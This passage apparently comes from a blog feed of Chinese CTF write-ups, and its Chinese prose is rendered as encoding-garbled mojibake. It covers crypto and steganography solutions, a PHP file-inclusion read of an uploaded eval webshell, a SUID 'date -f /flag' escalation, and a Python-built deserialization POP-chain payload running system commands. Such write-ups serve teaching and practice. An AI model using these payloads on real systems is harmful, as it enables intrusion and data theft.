class="number">0</span>]</span><br><span class="line">            zz = (b - x^<span class="number">12</span> - yy^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)%p</span><br><span class="line">            d = inverse_mod(ee, p-<span class="number">1</span>)</span><br><span class="line">            m1 = <span class="built_in">pow</span>(yy, d, p)</span><br><span class="line">            m2 = <span class="built_in">pow</span>(zz, d, p)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;48454354467b&#x27;</span> <span class="keyword">in</span> <span class="built_in">hex</span>(m1)[<span class="number">2</span>:]:</span><br><span class="line">                <span class="built_in">print</span>(x)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]+<span class="built_in">hex</span>(m2)[<span class="number">2</span>:]))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="comment"># 3989</span></span><br><span class="line"><span class="comment"># HECTF&#123;46de31725b9a50b20e27cab2ddd5f5845cdd19066b4f97612&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="å’¦-å°é²¨é±¼æ¥å–½"><a href="#å’¦-å°é²¨é±¼æ¥å–½" class="headerlink" title="å’¦~å°é²¨é±¼æ¥å–½"></a>å’¦~å°é²¨é±¼æ¥å–½</h3><p>wiresharkæ‰“å¼€æµé‡æ–‡ä»¶ï¼Œé€ä¸ªæµæŸ¥çœ‹ï¼Œä¸€çœ¼æ‰¾åˆ°flagã€‚</p><p>â€‹    </p><h3 id="æ¥ç©æ‰è¿·è—å‘€"><a href="#æ¥ç©æ‰è¿·è—å‘€" class="headerlink" title="æ¥ç©æ‰è¿·è—å‘€"></a>æ¥ç©æ‰è¿·è—å‘€</h3><blockquote><p>ä½ èƒ½å¯»æ‰¾åˆ°çœŸæ­£çš„æˆ‘å—ï¼Ÿ</p></blockquote><p>pngå›¾ç‰‡æœ‰lsbéšå†™ï¼Œzstegæå–å‡ºå†…å®¹ï¼š <code>zsteg -E &quot;b1,rgb,lsb,xy&quot; 1010.png &gt; out1.txt</code>ï¼Œ</p><p>å¾—åˆ°16è¿›åˆ¶å­—ç¬¦ä¸²è½¬stringï¼Œå†xor 0x33å‘ç°zipå‹ç¼©åŒ…å¤´ï¼Œæå–å‡ºzipå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°flag.docï¼Œå°†æ–‡å­—å…¨é€‰è®¾ç½®é¢œè‰²ï¼Œå‘ç°flagï¼š<code>HECTF&#123;hah0ha_Find-Me!!!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ä½ æŠŠæˆ‘flagè—å“ªå»äº†"><a href="#ä½ æŠŠæˆ‘flagè—å“ªå»äº†" class="headerlink" title="ä½ æŠŠæˆ‘flagè—å“ªå»äº†?"></a>ä½ æŠŠæˆ‘flagè—å“ªå»äº†?</h3><p>flag.docxä¸­æ‰“å¼€éšè—æ–‡å­—ï¼Œå¾—åˆ°çš„base64è§£ç å¾—ç¬¬ä¸€æ®µå­—ç¬¦ä¸²ï¼š</p><p><code>kgkhlfloanaiufpghhalwujklkmownplkmwlygalpmfkgyggihuldlgaoyuloiggrplkvkgmrkaqzxemmiwklhugekleolpaaolffmaghmfgfmgvgjnblpmlajapufjlgplaojpjbffbjbwhuglggyjngmlbfygljbgxkixlmmqiksmpaqyojerafekadxdxxbarxlgngymsimhvuwkaexsglrapggkabmfulgvnmajufoekymalimxdijjpxyiagbpmkuallnlkpoeagfldlposkizvyxraazxrgxanoihqlxfogfgglpgjylkeakbylfvjomllkgjgymgfdlrpeqfklfslmejilpjiklpaapglxyevfkylfappbkdzflffllikqnialkbhjorndhsfomfaypghpqoxryimhfllfhlmkoreamroakgrljahmfailijanykfuaihfbzafaufmsffngfalmrbfflfaffwlnjmfgaaffauazjfijxiabfirmovpzekirbasfjsgzlukolyvohmvaalpkahsxfzammbfnmldzyaauifldvkmzbgfybaoffrflfoaadgmllnbgfpnrgxllyphyfnlexbvdnlokgoyilprflonshalkjaxngbjhlmbpdlamhkjfnlgmaagfjnjgkfrizlfflpmmglapxgmuninaaupkpfdigpsasmvkdjvgiyofdumpngpaljkjblfhahskiokpfgaayhnnfdsxkffqjaazvvdosefppfofigyamfnfngvlaoapdyixvbfdosobmlubaiugjxhfyfkvrakazgluyilpvgfwgynqggplbkwiiaxarlaflaalfkxfjlpegmmajngujlofuiffmvikfimraogqalalfmgubagfggoaakgrfqfhaemosraafyfopukudaalfggimhdfognhkrleflpalgalfapyjalgvoklgfllgaflaafafmazygpehfkzhlazngfmofliazlvnxanalugjlafovljfjubzgapehhfkfnfnggpalylivfegaaidrmyjagfalgmagflrklugadpffuaaky</code></p><p>otherflag.txtä¸­å«æœ‰é›¶å®½å­—ç¬¦ï¼Œåˆ©ç”¨åœ¨çº¿ç½‘ç«™æå–å‡ºç¬¬äºŒæ®µå­—ç¬¦ä¸²ï¼š</p><p><code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p><p>çœ‹å­—ç¬¦ä¸²æ— è§„å¾‹ï¼ŒçŒœæµ‹ä¸ºå­—ç¬¦é¢‘ç‡ç»Ÿè®¡ï¼Œæ‰¾ä¸€ä¸ª<a href="https://uutool.cn/str-statistics/">åœ¨çº¿å·¥å…·</a>ç»Ÿè®¡å­—ç¬¦å‡ºç°æ¬¡æ•°ï¼ŒæŒ‰ç»“æœä»å¤§åˆ°å°æ’åºå–å‡ºå¯¹åº”å­—ç¬¦ä¸º <code>flagkpomijnhuybrvdxezswq&#123;&#125;</code>ï¼Œè°ƒæ•´æ‹¬å·ä½ç½®å³ä¸ºflagï¼š<code>flag&#123;kpomijnhuybrvdxezswq&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£"><a href="#æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£" class="headerlink" title="æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£"></a>æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£</h3><p>å›¾ç‰‡å†…æ–‡å­—ç”¨åœ¨çº¿OCRè¯†åˆ«è½¬æ–‡å­—ï¼Œhexè½¬å­—ç¬¦ï¼Œæ ¹æ®æ–‡ä»¶å¤´è½¬å­˜ä¸ºzipå‹ç¼©åŒ…ï¼Œä½¿ç”¨ARCHPRçˆ†ç ´å‡ºå¯†ç 8686ï¼Œè§£å‹å¾—åˆ°txtå†…ä¸ºéŸ³ç¬¦åŠ å¯†ï¼Œä½¿ç”¨<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">åœ¨çº¿è§£å¯†å·¥å…·</a>è§£å¯†å¾—åˆ°flagï¼š<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="2022HECTFè°ƒæŸ¥é—®å·"><a href="#2022HECTFè°ƒæŸ¥é—®å·" class="headerlink" title="2022HECTFè°ƒæŸ¥é—®å·"></a>2022HECTFè°ƒæŸ¥é—®å·</h3><p>å†™é—®å·å¾—flagã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;2022HECTFæ˜¯ç”±æ²³åŒ—å¸ˆèŒƒå¤§å­¦SourceCodeæˆ˜é˜Ÿç»„ç»‡çš„é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„CTFç«æŠ€æ´»åŠ¨ï¼Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦è®¡ç®—æœºä¸ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢ä¸»åŠï¼Œæ²³åŒ—çœç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é‡ç‚¹å®éªŒå®¤å’Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦ä¿¡æ¯å®‰å…¨åä¼šæ‰¿åŠï¼Œæ˜¯é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„ä¸€æ¬¡ç«æŠ€æ´»åŠ¨ã€‚&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2022å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›</title>
    <link href="https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2022-09-04T05:46:20.000Z</published>
    <updated>2022-09-04T13:50:35.327Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>å¤§èµ›ç”±ä¸­å…±å¹¿å·å¸‚å§”ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–å§”å‘˜ä¼šåŠå…¬å®¤ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¹¿å·å¸‚ç½‘ç»œå®‰å…¨äº§ä¸šä¿ƒè¿›ä¼šä¸»åŠï¼Œå¹¿ä¸œå¤–è¯­å¤–è´¸å¤§å­¦ã€æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸æ‰¿åŠï¼Œå¹¿å·å¸‚ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒã€å¹¿å·äº’è”ç½‘åä¼šååŠã€‚</p><p>å¤§èµ›ä»¥â€œç½‘ç»œå®‰å…¨ä¸ºäººæ°‘ã€ç½‘ç»œå®‰å…¨é äººæ°‘â€ä¸ºä¸»é¢˜ï¼Œæ—¨åœ¨é€šè¿‡ç«èµ›çš„æ–¹å¼æé«˜å‚èµ›é€‰æ‰‹æ”»é˜²å…¼å¤‡çš„ç½‘ç»œå®‰å…¨å®è·µæŠ€èƒ½ï¼Œå®ç°ä»¥èµ›ä¿ƒå­¦ã€ä»¥èµ›ä¼šå‹ï¼ŒåŠ å¼ºä¸åŒé™¢æ ¡åŠå•ä½é—´çš„æŠ€æœ¯äº¤æµã€‚</p><p>æœ¬å±Šå¤§èµ›ç”±ã€å¹¿å¤–å¥³ç”Ÿæˆ˜é˜Ÿã€‘ä¸æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸å…±åŒå‘½é¢˜ï¼Œé‡‡ç”¨CTFï¼ˆå¤ºæ——èµ›ï¼‰å›¢é˜Ÿç«èµ›æ¨¡å¼ï¼Œå‚èµ›é˜Ÿä¼é€šè¿‡äº’è”ç½‘åœ¨çº¿è§£é¢˜ï¼Œé¢˜ç›®ç±»å‹æ¶‰åŠWebå®‰å…¨ã€é€†å‘å·¥ç¨‹ (Reverse)ã€äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜å’Œåˆ©ç”¨ï¼ˆPwnï¼‰ã€å¯†ç å­¦ï¼ˆCryptoï¼‰ã€æ‚é¡¹ï¼ˆMiscï¼‰ç­‰ç±»åˆ«ã€‚</p><p>æ¯”èµ›æ—¶é—´ï¼š9æœˆ3æ—¥ 9:00 - 9æœˆ4æ—¥ 9:00</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><blockquote><p>ç®€å•web</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> False;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fliter</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>éé¢„æœŸã€‚Dirsearchæ‰«ä¸€ä¸‹å‘ç°ä»–äººä¸Šä¼ çš„shell.phpï¼Œåˆ©ç”¨fileå‚æ•°include+ä¼ªåè®®åŒ…å«ä¸€ä¸‹ï¼š</p><p><code>?file=php://filter/read=convert.base64-encode/resource=shell.php</code></p><p>base64è§£ç å¾—åˆ°æºç ï¼š<code>&lt;?php @eval($_POST[a]);?&gt;</code></p><p>ç”¨èšå‰‘è¿æ¥ä¸Šï¼Œåœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿæ— æ³•æŸ¥çœ‹ã€‚</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code> æŸ¥çœ‹å…·æœ‰SUIDæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°dateå‘½ä»¤å¯ç”¨ï¼Œææƒï¼š</p><p><code>date -f /flag</code></p><p>åœ¨æŠ¥é”™æ–‡å­—ä¸­è·å–flagå†…å®¹ã€‚</p><p>â€‹    </p><h3 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h3><blockquote><p>Wake up!Pop corn is not safe food,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;no pop&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>æ‰¾ååºåˆ—åŒ–popé“¾ï¼š</p><p><code>Test/getFlag() &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>ç”±äºç±»Aå­˜åœ¨è¿‡æ»¤ <code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>ï¼Œç±»Aä¸èƒ½è°ƒç±»Testï¼Œåˆ©ç”¨ä¸Šç±»Funï¼š</p><p><code>Fun/__call($f,$p)  &lt;- A/__get($p) &lt;- B/__destruct()</code></p><p>ç¼–å†™è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fun</span>:</span><br><span class="line">    private_func = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_a = Fun()</span><br><span class="line">     </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    <span class="comment"># public_p = &#x27;ls /&#x27;</span></span><br><span class="line">    public_p = <span class="string">&#x27;cat /flag?&#x27;</span></span><br><span class="line">    public_a = A()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(quote(serialize(B())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>ç”±äºç±»Funæœ‰ <code>__wakeup()</code> ä¼šæ¸…ç©º <code>private $func</code>ï¼Œä¿®æ”¹æ•°å­—ç»•è¿‡ <code>__wakeup()</code>ï¼š</p><p><code>O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D</code></p><p>ä¼ å…¥popå‚æ•°å¾—åˆ°flagã€‚</p><p>â€‹    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="where-is-secret"><a href="#where-is-secret" class="headerlink" title="where_is_secret"></a>where_is_secret</h3><blockquote><p>easy_misc</p></blockquote><p>ä¸€ä¸ªvig.txtå’Œä¸€ä¸ªzipå‹ç¼©åŒ…ï¼Œtxtä¸­æ–‡å­—</p><p><code>Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo</code></p><p>ä½¿ç”¨<a href="https://guballa.de/vigenere-solver">åœ¨çº¿ç»´å‰å°¼äºšå¯†ç è§£å¯†ç½‘ç«™</a>è§£å‡ºæ˜æ–‡ï¼š</p><p><code>Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds</code></p><p>ç”¨å¯†ç  <code>GWHT@R1nd0yyds</code> è§£å‹zipï¼Œå¾—åˆ°ä¸€å¼ bmpå›¾ï¼Œæ ¹æ®æ¯”èµ›ä¸­æœŸæ”¾çš„hintæç¤ºåŠ å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">text</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 